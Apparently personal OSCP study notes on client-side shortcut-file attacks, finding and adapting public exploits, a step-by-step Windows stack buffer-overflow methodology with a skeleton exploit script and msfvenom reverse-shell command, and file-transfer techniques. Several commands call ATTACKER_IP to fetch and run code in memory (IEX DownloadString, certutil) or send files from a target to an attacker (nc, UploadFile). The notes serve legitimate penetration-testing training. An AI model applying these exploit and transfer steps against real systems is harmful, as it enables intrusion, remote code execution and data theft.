Malicious.lnk
      ↓
User double-clicks
      ↓
Windows follows shortcut
      ↓
Referenced command/program executes
```

This makes `.lnk` files useful in certain **phishing/client-side** scenarios.

---

### Important Files to Recognize

|File|Purpose|
|---|---|
|`.lnk`|Windows shortcut|
|`.url`|Internet shortcut|
|`.scf`|Shell Command File|
|`.hta`|HTML Application|
|`.search-ms`|Windows Search file|
|`.library-ms`|Windows Library description|

The key OSCP idea is:

> **Don't assume a file is harmless just because it isn't an `.exe`.**

Some Windows file types can cause Explorer or another Windows component to perform actions when opened.

### Enumeration Mindset

When you obtain access to a Windows machine, pay attention to:

```
Downloads/
Desktop/
Documents/
Network shares/
USB/removable media
```

Look for unusual:

```
.lnk
.url
.hta
.scf
```

files and investigate what they actually reference before executing anything.

**OSCP takeaway:** Client-side attacks aren't limited to exploiting a software vulnerability. They can also abuse **trusted Windows functionality and file types** to get a user to trigger an action.

# ==Locating Public Exploit==
![[images.png]]


![[Pasted image 20260916070707.png]]
## 1. What is a Public Exploit?

A **public exploit** is code or a working technique publicly available that targets a known vulnerability.

Common sources:

- Exploit-DB
- GitHub
- SearchSploit
- Metasploit Framework
- Vendor advisories
- Security research blogs

---

## 2. When to Search for Exploits

After identifying:

```
Service → Version → Vulnerability/CVE → Public Exploit
```

Example:

```
Apache 2.4.49
      ↓
CVE-2021-41773
      ↓
Search for public exploit
```

**Don't search blindly.** First fingerprint the service and version.

---

## 3. SearchSploit

Search locally for Exploit-DB entries:

```
searchsploit apache 2.4
```

Search by CVE:

```
searchsploit CVE-2021-41773
```

Show the exploit path:

```
searchsploit -p 50435
```

Copy an exploit to your current directory:

```
searchsploit -m 50435
```

Read the exploit:

```
cat 50435.py
```

---

## 4. GitHub

Search using specific identifiers:

```
"CVE-2021-41773"
"Apache 2.4.49 exploit"
"product version exploit"
```

Useful searches:

```
<product> <version> exploit
<CVE-ID> exploit
<CVE-ID> PoC
<service> RCE PoC
```

Be careful: **PoC ≠ automatically reliable or safe to run.**

---

## 5. Metasploit

Search the Metasploit database:

```
msfconsole
```

Then:

```
search CVE-2021-41773
```

or:

```
search type:exploit apache
```

Inspect a module:

```
info <module>
```

---

## 6. Verify the Exploit

Before running a public exploit, check:

### Target compatibility

- Correct product?
- Correct version?
- Correct OS?
- Correct architecture?
- Correct protocol/service?

### Exploit requirements

- Authentication required?
- Specific configuration required?
- Specific endpoint?
- Local or remote exploitation?
- Required privileges?

### Code quality

Read the source.

Look for:

```
Hardcoded IPs
Hardcoded ports
Payload requirements
Python dependencies
Dangerous commands
Destructive actions
Incorrect version assumptions
```

---

## 7. Adapt the Exploit

Public exploits often need modification.

Typical changes:

```
TARGET = "10.10.10.10"
PORT = 8080
LHOST = "10.10.14.5"
LPORT = 4444
```

Install missing dependencies if required:

```
pip install -r requirements.txt
```

or:

```
python3 -m pip install <package>
```

---

## 8. Public Exploit Workflow

```
Enumerate
   ↓
Identify service/version
   ↓
Find CVE
   ↓
Search public exploits
   ↓
Check compatibility
   ↓
Read source code
   ↓
Modify if necessary
   ↓
Test safely
   ↓
Confirm vulnerability
   ↓
Exploit
```

---

## 9. Important OSCP Rule

**Never blindly run a public exploit.**

A public exploit may:

- Target a different version
- Require a specific configuration
- Crash the service
- Use the wrong payload
- Contain bugs
- Be a fake/malicious PoC

The important skill is:

> **Understand the vulnerability first, then understand what the exploit code is actually doing.**

# ==Fixing Exploits==
![[tool6-768x455.jpeg]]
**Fixing an Exploit** means modifying a public exploit so it works correctly against the target environment.

#### Why an exploit may fail

- Different **OS version**
- Different **application/service version**
- Different **architecture**: x86 vs x64
- Different **Python version**
- Missing dependencies/modules
- Hardcoded IP, port, URL, or file path
- Incorrect ==offsets== or memory addresses
- Payload not compatible with the target
- Exploit requires authentication or specific configuration

#### Basic workflow

```
1. Identify target version
        ↓
2. Find a matching public exploit
        ↓
3. Read and understand the exploit
        ↓
4. Install/fix dependencies
        ↓
5. Replace hardcoded values
        ↓
6. Fix syntax/runtime errors
        ↓
7. Adjust payload / architecture
        ↓
8. Test in the lab
        ↓
9. Confirm successful exploitation
```

#### 1. Read the exploit first

Don't immediately run it.

Look for:

```
TARGET
VERSION
PORT
USERNAME/PASSWORD
LHOST
LPORT
PAYLOAD
OFFSET
PATH
DEPENDENCIES
```

Useful commands:

```
head -n 50 exploit.py
less exploit.py
grep -nE 'LHOST|LPORT|IP|PORT|VERSION|PAYLOAD' exploit.py
```

#### 2. Fix dependencies

Example:

```
python3 exploit.py
```

If you get:

```
ModuleNotFoundError: No module named 'requests'
```

Install the missing module:

```
pip3 install requests
```

For older Python exploits, check whether they were written for Python 2:

```
python2 exploit.py
```

or port the code to Python 3.

#### 3. Replace hardcoded values

Example:

```
target = "192.168.1.100"
port = 8080
```

Change them to your lab target:

```
target = "10.10.10.50"
port = 8080
```

Likewise, replace:

```
LHOST
LPORT
TARGET
```

with your lab values.

#### 4. Check architecture

Determine target architecture:

```
uname -m
```

Common values:

```
x86_64  → 64-bit
i686    → 32-bit
```

A payload compiled for x64 generally won't work correctly on a 32-bit target.

#### 5. Fix syntax/runtime problems

Example:

```
SyntaxError
IndentationError
TypeError
NameError
ModuleNotFoundError
```

Understand the error before modifying the exploit.

Useful debugging:

```
python3 -m py_compile exploit.py
```

For Python:

```
print(variable)
```

For Bash:

```
bash -x exploit.sh
```

#### 6. Check the payload

The exploit itself may work while the payload fails.

Verify:

```
LHOST = your VPN/interface IP
LPORT = listening port
payload architecture = target architecture
payload type = compatible with target
```

Find your VPN IP:

```
ip addr
```

Listen:

```
nc -lvnp 4444
```

#### 7. Understand offsets

Some memory-corruption exploits require an exact offset.

Typical workflow:

```
Crash application
      ↓
Find controlled instruction pointer
      ↓
Calculate offset
      ↓
Replace offset in exploit
      ↓
Test again
```

Tools such as **pattern generation** can help identify the correct offset.

#### 8. Don't blindly trust Exploit-DB/GitHub exploits

A public exploit may be:

```
PoC only
incomplete
version-specific
old
unstable
missing dependencies
written for a different architecture
```

Always compare:

```
Exploit version
        vs
Target version
```

### OSCP mindset

> **A public exploit is a starting point, not necessarily a ready-to-use solution.**

For the exam/labs, focus on being able to:

- Read the exploit
- Understand what it does
- Identify why it fails
- Modify configuration
- Fix dependencies
- Adapt the payload
- Adjust offsets when necessary
- Test systematically

**Key idea:** Don't rewrite the entire exploit immediately. **Make the smallest change necessary, test, observe the error, and iterate.**




# ==Buffer Overflow==
![[images.jpeg]]
## Steps required to crack a safe?

- #### Understand the inner working

- #### Use the right tools

- #### Listen for the right TICK

- #### Do the magic

- #### Open the safe

## ==Tools well Used:==

- #### Immunity Debugger
- #### x64dbg
- #### WinDbg

## ==Basics==:

![[Pasted image 20260920050359.png]]
## How CPU Work:
![[Pasted image 20260920050515.png]]


## Registers:
**![[Pasted image 20260920050849.png]]**

## Memory:
![[Pasted image 20260920051430.png]]

## ==Summery :==
![[Pasted image 20260920052000.png]]

## ==1. What is a Buffer Overflow?==

A **buffer overflow** happens when a program writes more data into a memory buffer than the buffer was designed to hold.

Example:

```
char buffer[100];
strcpy(buffer, user_input);
```

If `user_input` contains 500 bytes, the extra data can overwrite adjacent memory.

In an exploitable stack overflow, this may allow us to overwrite:

- Saved return address
- `EIP` — 32-bit instruction pointer
- `RIP` — 64-bit instruction pointer
- Other stack data
- Potentially execution flow

### Basic idea

```
Normal:

[ Buffer ][ Saved EBP ][ Return Address ]

Overflow:

[ AAAA...AAAA ][ BBBB ][ CCCC ]
                         ↑
                    EIP / RIP
```

If we control the return address, we may be able to redirect execution to attacker-controlled code.

![[Pasted image 20260921033315.png]]

![[Pasted image 20260921034652.png]]
## How Ram Work :
![[Pasted image 20260920052812.png]]

-----------
----------

## How Inner Working:

![[Pasted image 20260920231337.png]]

![[Pasted image 20260920223236.png]]

## Important Registers

## 32-bit

### EIP

**Instruction Pointer**

Contains the address of the next instruction to execute.

Example:

```
EIP = 0x41414141
```

`0x41` = `A`

So:

```
AAAA → 41414141
```

If you can make EIP equal to `0x41414141`, you have demonstrated control over EIP.

---

## ESP

**Stack Pointer**

Points to the current top of the stack.

Important because after controlling EIP, you may redirect execution to instructions that eventually reach your payload around `ESP`.

---

## EBP

**Base Pointer**

Used to reference the current stack frame.

It is commonly overwritten during a stack overflow, but usually isn't the primary target.

---

## 4. 32-bit vs 64-bit

### 32-bit

```
EIP
ESP
EBP
```

Return address:

```
4 bytes
```

### 64-bit

```
RIP
RSP
RBP
```

Return address:

```
8 bytes
```

OSCP-style classic Windows buffer overflow exercises are commonly 32-bit, but you should understand both.

---

## 5. How an Exploit Is Developed
![[Pasted image 20260921051808.png]]


#### Typical workflow:

```
1. Find vulnerable application
        ↓
2. Find crashing input
        ↓
3. Determine exact offset
        ↓
4. Control EIP/RIP
        ↓
5. Identify bad characters
        ↓
6. Find JMP/CALL ESP/RSP
        ↓
7. Generate payload
        ↓
8. Build final exploit
        ↓
9. Test
```

---

## 6. Step 1 — Find the Vulnerable Input

Suppose an application accepts:

```
USER /admin
PASS password
```

or a network service accepts:

```
TRUN /AAAAAAAAAAAA
```

Start with a simple payload:

```
payload = b"A" * 100
```

Then increase it:

```
payload = b"A" * 500
```

```
payload = b"A" * 1000
```

until the application crashes.

Example:

```
payload = b"A" * 2000
```

If the program crashes, you've established that the input can affect memory.

---

## 7. Crash Analysis

Attach a debugger such as:

- Immunity Debugger
- x64dbg
- WinDbg

For classic OSCP Windows BOF practice, Immunity Debugger is commonly encountered.

After sending:

```
AAAAAA....
```

you might see:

```
EIP = 41414141
```

This is excellent evidence.

Because:

```
A = 0x41
```

Therefore:

```
41414141 = AAAA
```

Meaning your input reached EIP.

---

## 8. Why We Need an Exact Offset

Suppose you send:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
BBBB
CCCCCCCCCCCC
```

and EIP becomes:

```
42424242
```

You know the `BBBB` reached EIP.

But you don't yet know exactly how many bytes are required before EIP.

For example:

```
[ 100 bytes ][ EIP ][ remaining data ]
```

You need to determine that `100` precisely.

---

## 9. Cyclic Pattern

Instead of:

```
AAAAAAA...
```

use a unique cyclic pattern.

For example:

```
Aa0Aa1Aa2Aa3Aa4Aa5...
```

Each sequence of characters is unique.

When the application crashes, you inspect EIP.

Example:

```
EIP = 39654138
```

You search for that value in the generated pattern.

Result:

```
Offset = 2003
```

Therefore:

```
2003 bytes → EIP
```

---

## 10. Metasploit Pattern Tools

On Kali:

```
msf-pattern_create -l 3000
```

Example:

```
msf-pattern_create -l 3000 > pattern.txt
```

Send the pattern to the application.

After the crash:

```
EIP = 39654138
```

Find the offset:

```
msf-pattern_offset -q 39654138 -l 3000
```

Example result:

```
[*] Exact match at offset 2003
```

So:

```
EIP offset = 2003
```

---

## 11. Verify EIP Control

Now create:

```
payload = b"A" * 2003
payload += b"B" * 4
```

Send it.

Expected:

```
EIP = 42424242
```

Because:

```
BBBB
↓
42 42 42 42
```

If you see:

```
EIP = 42424242
```

you have confirmed:

> **Reliable control of EIP.**

This is a major milestone.

---

## 12. Endianness

This is extremely important.

x86 processors generally use **little-endian** byte ordering.

Suppose an address is:

```
0x625011AF
```

In memory you normally write:

```
AF 11 50 62
```

Using Python:

```
import struct

address = struct.pack("<I", 0x625011AF)
```

Or:

```
p32(0x625011AF)
```

with pwntools.

### Remember

```
0x12345678
```

becomes:

```
78 56 34 12
```

---

## 13. Find Bad Characters

After controlling EIP, you need to determine which bytes are modified, removed, or interpreted specially by the application.

A common starting set is:

```
\x01\x02\x03...\xff
```

excluding:

```
\x00
```

initially.

---

## Why?

Suppose your payload contains:

```
\x00\x01\x02\x03\x04\x05...
```

but memory shows:

```
\x00
```

and then the data stops.

That indicates:

```
\x00 = bad character
```

because NULL terminates the string.

---

## ==14. Bad Character Testing==
![[Pasted image 20260921050521.png]]
Generate a byte array:

```
badchars = bytes(range(1, 256))
```

Put it after your controlled EIP:

```
[padding][EIP][badchars]
```

Run the exploit.

Then inspect the memory around `ESP`.

Compare:

```
Expected:

01 02 03 04 05 06 07 08 ...

Actual:

01 02 03 04 05 06 07 08 ...
```

If they match, continue.

If you find:

```
Expected:

... 2A 2B 2C 2D 2E ...

Actual:

... 2A 2B 2D 2E ...
```

then:

```
0x2C
```

may be a bad character.

Remove it and test again.

---

## 15. Important Bad Characters

There is **no universal bad-character list**.

It depends on the application/protocol.

Common examples include:

```
00  NULL
0A  LF
0D  CR
20  SPACE
25  %
26  &
2B  +
3D  =
```

But don't automatically assume they're bad.

**Test them.**

---

## 16. Finding a Jump

You now have:

```
[ Padding ][ EIP ][ Payload ]
```

You control EIP.

The next problem:

> Where should EIP point?

A common technique in 32-bit Windows exploits is:

```
JMP ESP
```

Why?

Because after `JMP ESP`:

```
EIP
 ↓
JMP ESP
 ↓
ESP
 ↓
Your payload
```

Conceptually:

```
[ AAAAA... ][ JMP ESP ][ NOP ][ Shellcode ]
                         ↑
                        ESP
```

---

## 17. Find JMP ESP

You can search loaded modules for:

```
JMP ESP
```

Using tools such as:

- Mona
- msfelfscan / msfpescan in appropriate contexts
- debugger functionality

With Mona, a common workflow is:

```
!mona modules
```

Then identify suitable modules.

Search for:

```
JMP ESP
```

The important characteristics of the chosen module/address include:

- Loaded in the target process
- Suitable permissions
- No bad characters in the address
- Stable/reliable
- Appropriate architecture

---

## 18. ASLR / DEP / SafeSEH

Modern mitigations matter.

## ASLR

**Address Space Layout Randomization**

Randomizes locations of modules/memory.

Problem:

```
JMP ESP = 0x625011AF
```

may not stay at that address between executions.

For classic OSCP labs, you may encounter modules without ASLR.

---
![[Pasted image 20260921055306.png]]

----------------
## DEP

**Data Execution Prevention**

Prevents execution from memory regions that are marked non-executable.

Without DEP:

```
ESP → shellcode
```

may work directly.

With DEP:

```
ESP → shellcode
```

may fail because the stack isn't executable.

You may need a technique such as:

```
ROP
```

to call an existing executable function or change memory permissions.

---

## SafeSEH

A Windows exception-handling protection mechanism.

It can make certain SEH-based exploitation techniques harder.

For basic stack BOF:

```
Focus first on EIP control.
```

---

## 19. NOP Sled

A NOP instruction on x86 is commonly:

```
\x90
```

A NOP sled:

```
\x90\x90\x90\x90\x90\x90
```

Conceptually:

```
JMP ESP
   ↓
NOP
NOP
NOP
NOP
   ↓
Shellcode
```

If execution lands anywhere in the sled, the CPU continues until it reaches the shellcode.

A NOP sled is not always necessary, but it is a classic technique.

---

## 20. Shellcode

Shellcode is machine code designed to perform an action after execution is obtained.

In OSCP labs, this may be something like:

```
reverse shell
```

The important concept is:

```
Buffer Overflow
      ↓
Control EIP
      ↓
Redirect execution
      ↓
Execute shellcode
      ↓
Get code execution
```

---

## 21. Generate Shellcode

Metasploit can generate payloads.

Example:

```
msfvenom -p windows/shell_reverse_tcp \
LHOST=10.10.14.10 \
LPORT=4444 \
-f python \
-b "\x00"
```

The exact payload depends on:

- Target OS
- Architecture
- Network path
- Bad characters
- Lab requirements

Always exclude the bad characters you discovered.

---

## 22. Listener

For a reverse shell:

```
nc -lvnp 4444
```

Then execute the exploit.

If successful:

```
Target → Attacker
```

and your listener receives the connection.

---

## 23. Final Exploit Structure

A classic 32-bit exploit often looks like:

```
import socket
import struct

offset = 2003

jmp_esp = 0x625011AF

payload = b"A" * offset
payload += struct.pack("<I", jmp_esp)
payload += b"\x90" * 16
payload += shellcode

s = socket.socket()
s.connect(("10.10.10.10", 9999))

s.send(payload)
```

The important structure is:

```
AAAAAAAAAAAAAAAAAAAA
        ↓
[ OFFSET ]
        ↓
[ JMP ESP ]
        ↓
[ NOP SLED ]
        ↓
[ SHELLCODE ]
```

---

## 24. Why JMP ESP Works

Suppose:

```
ESP = 0x0012FF00
```

and your payload is located there.

You overwrite:

```
EIP = 0x625011AF
```

where:

```
0x625011AF = JMP ESP
```

Execution:

```
RET
 ↓
EIP = 0x625011AF
 ↓
JMP ESP
 ↓
ESP = 0x0012FF00
 ↓
Shellcode
```

So the exploit doesn't necessarily need to know the exact shellcode address.

It only needs a reliable instruction that redirects execution to the stack.

---

## 25. Complete Methodology

Memorize this:

```
              BUFFER OVERFLOW
                    │
                    ▼
            Find crash length
                    │
                    ▼
             Generate pattern
                    │
                    ▼
             Crash application
                    │
                    ▼
              Read EIP/RIP
                    │
                    ▼
             Calculate offset
                    │
                    ▼
             Verify control
                    │
                    ▼
            Find bad characters
                    │
                    ▼
             Remove bad chars
                    │
                    ▼
          Find JMP ESP / ROP
                    │
                    ▼
            Generate payload
                    │
                    ▼
             Add shellcode
                    │
                    ▼
               Test exploit
                    │
                    ▼
             Obtain execution
```

---

## 26. OSCP Checklist

### Recon

- [ ]  Identify service
- [ ]  Identify vulnerable input
- [ ]  Identify target architecture
- [ ]  Attach debugger

### Crash

- [ ]  Send increasing payloads
- [ ]  Find crash point
- [ ]  Confirm controllable register

### Offset

- [ ]  Generate cyclic pattern
- [ ]  Crash with pattern
- [ ]  Read EIP/RIP
- [ ]  Calculate exact offset
- [ ]  Verify with `BBBB`

### Bad Characters

- [ ]  Generate byte array
- [ ]  Place after EIP
- [ ]  Inspect memory
- [ ]  Remove bad characters
- [ ]  Repeat until clean

### Control Flow

- [ ]  Check protections
- [ ]  Find `JMP ESP` / suitable gadget
- [ ]  Verify address contains no bad chars
- [ ]  Verify module reliability

### Payload

- [ ]  Generate shellcode
- [ ]  Exclude bad chars
- [ ]  Add NOP sled if appropriate
- [ ]  Build final buffer
- [ ]  Test listener
- [ ]  Obtain shell

---

## 27. Common Mistakes

### Mistake 1 — Guessing the offset

Don't do:

```
Maybe 1000 bytes?
```

Use a cyclic pattern.

---

### Mistake 2 — Not verifying EIP

Finding a crash isn't enough.

You want:

```
EIP = 42424242
```

---

### Mistake 3 — Ignoring bad characters

A payload can look correct but fail because one byte gets modified.

---

### Mistake 4 — Wrong endianness

Wrong:

```
625011AF
```

Correct byte representation:

```
AF 11 50 62
```

---

### Mistake 5 — Using an unstable address

A `JMP ESP` address must be appropriate for the target environment.

---

### Mistake 6 — Forgetting architecture

32-bit:

```
EIP
ESP
p32()
```

64-bit:

```
RIP
RSP
p64()
```

---

## 28. Key Commands

### Create pattern

```
msf-pattern_create -l 3000
```

### Find offset

```
msf-pattern_offset -q <EIP_VALUE> -l 3000
```

### Generate shellcode

```
msfvenom -p windows/shell_reverse_tcp \
LHOST=<YOUR_IP> \
LPORT=4444 \
-f python \
-b "\x00"
```

### Listener

```
nc -lvnp 4444
```

### Mona

```
!mona modules
```

Useful Mona commands you'll commonly encounter:

```
!mona find -s "\xff\xe4" -m <module>
```

`FF E4` corresponds to:

```
JMP ESP
```

---

## 29. The Most Important Concept

Don't memorize buffer-overflow exploitation as a collection of commands.

Understand the chain:

```
Input
 ↓
Buffer
 ↓
Overflow
 ↓
Saved Return Address
 ↓
EIP/RIP
 ↓
Controlled Execution
 ↓
JMP/ROP
 ↓
Payload
 ↓
Code Execution
```

And the **four things you absolutely need to establish** are:

```
1. Can I crash it?
2. Can I control EIP/RIP?
3. Can I control execution reliably?
4. Can I execute my payload?
```

If you can answer **yes** to all four, you've essentially completed the classic OSCP buffer-overflow methodology.






# ==File Transfer ==
![[files.png]]
## 1. Overview

File transfer is an essential post-exploitation skill.

After obtaining a shell on a target, you will often need to:

- Upload enumeration scripts.
    
- Upload exploits or binaries.
    
- Upload tools.
    
- Download sensitive files from the target.
    
- Transfer scripts between the attacker and target.
    
- Move files when common tools such as Netcat are unavailable.
    
- Avoid installing unnecessary tools on the target.
    

### Main Directions

There are two basic scenarios:

```text
Attacker ────────► Target
       Upload
```

```text
Attacker ◄──────── Target
       Download
```

---

## 2. Why Native Tools Matter

Uploading hacking tools to a compromised machine can create additional risks.

For example:

- Antivirus may detect tools such as Netcat or Nmap.
    
- Security software may alert the administrator.
    
- An administrator may discover the uploaded tools.
    
- Uploaded tools may remain on disk after the assessment.
    
- Forensic investigators may discover the tools later.
    

Therefore, whenever possible, prefer **native tools already available on the target**.

Examples:

### Windows

- PowerShell
    
- `certutil`
    
- FTP client
    
- Visual Basic Script
    
- TFTP when available
    

### Linux

- `curl`
    
- `wget`
    
- Python
    
- Netcat
    
- FTP
    
- SCP
    

The goal is to transfer files without unnecessarily introducing additional binaries.

---

## 3. Interactive vs Non-Interactive Shells

This distinction is extremely important when transferring files.

## Non-Interactive Shell

A non-interactive command can execute without requiring continuous user input.

Example:

```bash
ls
```

The command executes and returns its output.

---

## Interactive Command

An interactive command expects additional input from the user.

For example:

```bash
ftp
```

FTP normally asks for:

```text
Username:
Password:
ftp>
```

A basic Netcat reverse shell may not handle this interaction correctly.

---

## 4. The Netcat Shell Problem

Suppose you obtain a basic Netcat shell:

```bash
nc -lvnp 4444
```

The shell may allow:

```bash
ls
pwd
whoami
```

However, interactive applications such as:

```bash
ftp
```

may not work correctly.

You may type:

```bash
ftp
```

but not receive the expected:

```text
Username:
Password:
ftp>
```

This happens because the shell is not a proper interactive terminal.

The solution on Linux is to **upgrade the shell**.

---

## 5. Upgrading a Linux Netcat Shell

Python's `pty` module can be used to spawn a more interactive shell.

After obtaining the Netcat shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This gives you a better interactive shell.

However, it is still useful to perform the standard TTY upgrade.

### Step 1 — Spawn Bash

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Step 2 — Background the Shell

Press:

```text
Ctrl + Z
```

### Step 3 — Configure the Local Terminal

```bash
stty raw -echo
```

### Step 4 — Bring the Shell Back

```bash
fg
```

Press `Enter` if necessary.

You should now have a much more functional shell.

### Why Upgrade the Shell?

A proper TTY allows better interaction with:

- FTP
    
- `su`
    
- `sudo`
    
- editors
    
- interactive programs
    
- arrow keys
    
- command history
    
- `Ctrl+C`
    

---

## 6. Python PTY Command to Remember

For OSCP, memorize:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

A common full sequence is:

```text
Ctrl + Z

stty raw -echo

fg

Enter
```

---

## 7. Linux → Target: Python HTTP Server

One of the easiest ways to transfer files from Kali to a Linux or Windows target is to start a temporary HTTP server.

From the directory containing your file:

```bash
python3 -m http.server 8000
```

The server will expose the current directory over HTTP.

Target:

```bash
wget http://ATTACKER_IP:8000/file
```

or:

```bash
curl http://ATTACKER_IP:8000/file -o file
```

Example:

```bash
wget http://10.10.14.5:8000/linpeas.sh
```

Then:

```bash
chmod +x linpeas.sh
```

---

## 8. Python HTTP Server on Port 80

If necessary:

```bash
sudo python3 -m http.server 80
```

Target:

```bash
wget http://ATTACKER_IP/linpeas.sh
```

Port 80 can sometimes be useful when outbound firewall rules allow HTTP but restrict unusual ports.

---

## 9. Netcat File Transfer

Netcat can transfer files directly.

## Attacker → Target

Attacker:

```bash
nc -lvnp 4444 < exploit
```

Target:

```bash
nc ATTACKER_IP 4444 > exploit
```

Then:

```bash
chmod +x exploit
```

---

## Target → Attacker

Attacker:

```bash
nc -lvnp 4444 > file.txt
```

Target:

```bash
nc ATTACKER_IP 4444 < file.txt
```

The attacker receives the file as:

```text
file.txt
```

---

## 10. Socat

`Socat` can also be used for file transfers.

Example:

```bash
socat TCP-LISTEN:4444,reuseaddr,fork FILE:backup.zip
```

Then:

```bash
socat TCP:ATTACKER_IP:4444 FILE:backup.zip,create
```

The exact syntax may vary depending on the transfer direction and environment.

---

## 11. FTP

FTP is another possible file-transfer mechanism.

The video demonstrates using **Pure-FTPd** as the FTP server.

Install:

```bash
sudo apt install pure-ftpd
```

After configuring the FTP server, a target can connect using an FTP client.

However, FTP is **interactive**, which creates a problem when used through a basic Netcat shell.

---

## 12. Automated FTP with a Command File

Windows includes an FTP client by default on many systems.

Instead of manually interacting with FTP, commands can be placed into a file and passed to FTP automatically.

For example:

```text
open ATTACKER_IP
username
password
binary
get nc.exe
bye
```

Save the commands as:

```text
ftp.txt
```

Then execute:

```cmd
ftp -v -n -s:ftp.txt
```

### Important Options

```text
-v    Disable verbose output
-n    Prevent automatic login
-s    Specify a script file
```

The script can automate the entire FTP session.

---

## 13. FTP Binary Mode

When transferring executables or other binary files, use:

```text
binary
```

For example:

```text
open ATTACKER_IP
username
password
binary
get nc.exe
bye
```

Without binary mode, file transfers can be corrupted depending on the transfer type.

---

## 14. FTP Connection Delays

FTP is an old protocol and can sometimes behave poorly in modern environments.

If an automated FTP script appears to fail even though the credentials are correct:

1. Verify the credentials manually.
    
2. Verify that the FTP server is reachable.
    
3. Check whether the connection is timing out.
    
4. Increase the relevant timeout if necessary.
    
5. Retry the connection.
    

Always validate the basic connection before troubleshooting the script itself.

---

## 15. Windows FTP Client

Windows may already contain:

```cmd
ftp
```

Check:

```cmd
ftp -h
```

This is useful because you may be able to perform file transfers without uploading an additional FTP client.

---

## 16. Windows → Attacker with PowerShell

PowerShell provides several ways to download files.

### `Invoke-WebRequest`

```powershell
Invoke-WebRequest http://ATTACKER_IP/file.exe -OutFile file.exe
```

Short form:

```powershell
iwr http://ATTACKER_IP/file.exe -OutFile file.exe
```

---

## 17. PowerShell WebClient

Another common method:

```powershell
(New-Object Net.WebClient).DownloadFile(
    'http://ATTACKER_IP/file.exe',
    'file.exe'
)
```

This downloads:

```text
http://ATTACKER_IP/file.exe
```

and saves it locally as:

```text
file.exe
```

---

## 18. PowerShell Script Download

You can save PowerShell commands into a `.ps1` file.

Example:

```powershell
$webclient = New-Object Net.WebClient
$webclient.DownloadFile(
    "http://ATTACKER_IP/file.txt",
    "file.txt"
)
```

Execute it with:

```cmd
powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -File wget.ps1
```

### Useful Options

```text
-ExecutionPolicy Bypass
-NoProfile
-NonInteractive
-File
```

The exact options needed depend on the target's PowerShell configuration.

---

## 19. PowerShell One-Liner

A file can also be downloaded in one command:

```powershell
(New-Object System.Net.WebClient).DownloadFile(
    "http://ATTACKER_IP/file.txt",
    "file.txt"
)
```

This is useful when you don't want to create a separate script on disk.

---

## 20. Execute a Script Without Saving It

Sometimes you may want to execute code without first saving the script to disk.

Example concept:

```powershell
IEX (New-Object Net.WebClient).DownloadString(
    "http://ATTACKER_IP/script.ps1"
)
```

This downloads the script and executes its contents in memory.

### Why This Can Be Useful

The script itself does not need to be saved as a normal file on disk.

However:

- PowerShell logging may still record activity.
    
- Security software may detect the behavior.
    
- Network traffic can still be observed.
    
- "Fileless" does not mean "undetectable."
    

---

## 21. Certutil

Windows commonly includes `certutil.exe`.

It can be used to retrieve files:

```cmd
certutil -urlcache -split -f http://ATTACKER_IP/file.exe file.exe
```

Example:

```cmd
certutil -urlcache -split -f http://10.10.14.5:8000/nc.exe nc.exe
```

This can be useful when:

- PowerShell is restricted.
    
- You don't want to upload a separate download utility.
    
- `certutil` is available on the target.
    

---

## 22. SMB File Transfer

SMB is another useful option, especially between Kali and Windows.

On Kali:

```bash
impacket-smbserver share $(pwd) -smb2support
```

This creates an SMB share named:

```text
share
```

From Windows:

```cmd
copy \\ATTACKER_IP\share\file.exe .
```

Example:

```cmd
copy \\10.10.14.5\share\winPEAS.exe .
```

This can be particularly convenient for transferring multiple files.

---

## 23. SCP

If SSH access is available, SCP provides a simple file-transfer mechanism.

### Target → Attacker

```bash
scp user@TARGET_IP:/path/to/file .
```

### Attacker → Target

```bash
scp file user@TARGET_IP:/tmp/
```

Example:

```bash
scp linpeas.sh user@10.10.10.10:/tmp/
```

---

## 24. TFTP

TFTP can sometimes be used for file transfers.

Example:

```cmd
tftp -i ATTACKER_IP GET file.exe
```

However, TFTP availability depends on the Windows version and configuration.

The video notes that TFTP is not available by default on some older Windows versions/environments and may require installation/configuration.

---

## 25. Base64 / Hex Transfer

Sometimes normal file-transfer methods are unavailable.

A binary file can be transformed into text and transferred through a shell.

General process:

```text
Binary
   ↓
Compress
   ↓
Encode
   ↓
Transfer text
   ↓
Decode
   ↓
Reconstruct binary
```

This is useful when you can transfer text but cannot directly transfer binary data.

---

## 26. Compress Before Encoding

Compression can significantly reduce the amount of data that needs to be transferred.

For example:

```bash
upx --best nc.exe
```

Then convert the binary into a transferable representation.

The video demonstrates using:

```text
exe2hex
```

to convert an executable into a text-based representation.

---

## 27. exe2hex

Example:

```bash
exe2hex -x nc.exe -p nc.cmd
```

The resulting file contains commands that reconstruct the binary on the Windows target.

Conceptually:

```text
nc.exe
  ↓
compressed binary
  ↓
hex/text representation
  ↓
nc.cmd
  ↓
Windows reconstructs nc.exe
```

This is useful when direct binary transfer is difficult.

---

## 28. File Transfer: Target → Attacker

PowerShell can also upload files.

The video demonstrates the:

```text
UploadFile
```

method from:

```text
System.Net.WebClient
```

The general structure is:

```powershell
(New-Object System.Net.WebClient).UploadFile(
    "http://ATTACKER_IP/upload.php",
    "C:\path\to\file.txt"
)
```

---

## 29. Preparing the Attacker

You need a server-side endpoint capable of receiving the uploaded file.

For example, an HTTP server can use a PHP upload script.

Conceptually:

```text
Windows Target
      |
      | UploadFile()
      ↓
Attacker Web Server
      |
      ↓
/upload/
      |
      ↓
file.txt
```

The important idea is that the attacker must have an endpoint that accepts the uploaded data.

---

## 30. PHP Upload Handler

A simple PHP endpoint can receive an uploaded file and save it into an upload directory.

The exact implementation depends on the HTTP request format used by the client.

The key requirement is:

```text
Target → HTTP POST/upload → Attacker
```

---

## 31. Choosing a Transfer Method

When you need to move a file, first ask:

### 1. What OS am I dealing with?

```text
Linux
Windows
```

### 2. What native tools are available?

Linux:

```text
curl
wget
python
nc
scp
ftp
```

Windows:

```text
PowerShell
certutil
ftp
SMB
```

### 3. Is the transfer:

```text
Attacker → Target
```

or:

```text
Target → Attacker
```

### 4. Do I have an interactive shell?

If not, avoid tools that require interactive input.

### 5. Is the file binary?

If yes:

```text
Use binary mode
```

or consider:

```text
compression → encoding → reconstruction
```

---

## 32. Quick OSCP Cheat Sheet

## Start HTTP Server

```bash
python3 -m http.server 8000
```

## Linux Download

```bash
wget http://ATTACKER_IP:8000/file
```

```bash
curl http://ATTACKER_IP:8000/file -o file
```

